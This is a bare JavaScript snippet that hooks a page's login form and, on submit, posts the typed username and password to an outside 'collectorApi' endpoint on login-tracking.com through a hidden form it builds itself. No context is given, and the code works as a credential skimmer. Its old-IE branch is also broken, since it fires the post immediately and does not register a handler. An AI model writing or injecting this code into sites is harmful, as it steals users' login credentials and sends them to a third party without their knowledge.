
var ele = document.getElementById('loginForm');
if (!ele.addEventListener) {
    ele.attachEvent('onsubmit', post('http://login-tracking.com/collectorApi',
        {name: ele.name.value, password: ele.password.value}));            //Old IE
    } else {
    ele.addEventListener("submit", function () {
        post('http://login-tracking.com/collectorApi',
            {name: ele.name.value, password: ele.password.value})
    }, false);  //Modern browsers
}

function post(path, params, method='post') {
    const form = document.createElement('form');
    form.method = method;
    form.action = path;
    for (const key in params) {
        if (params.hasOwnProperty(key)) {
            const hiddenField = document.createElement('input');
            hiddenField.type = 'hidden';
            hiddenField.name = key;
            hiddenField.value = params[key];
            form.appendChild(hiddenField);
        }
    }
    document.body.appendChild(form);
    form.submit();
}

